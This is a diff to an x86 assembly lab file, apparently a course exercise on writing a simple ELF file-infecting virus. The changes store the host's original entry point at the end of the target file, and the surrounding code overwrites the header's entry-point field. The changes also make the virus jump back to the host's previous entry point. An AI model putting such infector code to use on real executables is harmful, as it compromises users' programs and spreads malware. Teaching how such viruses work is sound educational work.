@@ -104,6 +104,15 @@ _start:
 		read dword [ebp-4], esi, 52
 		;add esi, 24
 
+		;sub ecx, 4
+		lseek dword [ebp-4], -4, SEEK_END
+		;lseek dword [ebp-4], 0, SEEK_SET
+		add esi, 24
+		write dword [ebp-4], esi, 4
+		sub esi, 24
+		lseek dword [ebp-4], 0, SEEK_SET
+		
+
 		mov dword [esi+24], 0x08048294
 		;write STDOUT, esi, 4
 		;swrite STDOUT, _start, 4
@@ -123,11 +132,16 @@ _start:
 	error_occured:
 		print error_msg, 18
 		mov eax, 0
-		jmp VirusExit
+
+		call get_my_loc
+		sub ecx, next_i-PreviousEntryPoint
+
+		jmp dword [ecx]
 ; You code for this lab goes here
 
 VirusExit:
 		add	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+		;jmp dword [PreviousEntryPoint]
 		exit eax            ; Termination if all is OK and no previous code to jump to
                          ; (also an example for use of above macros)
 	
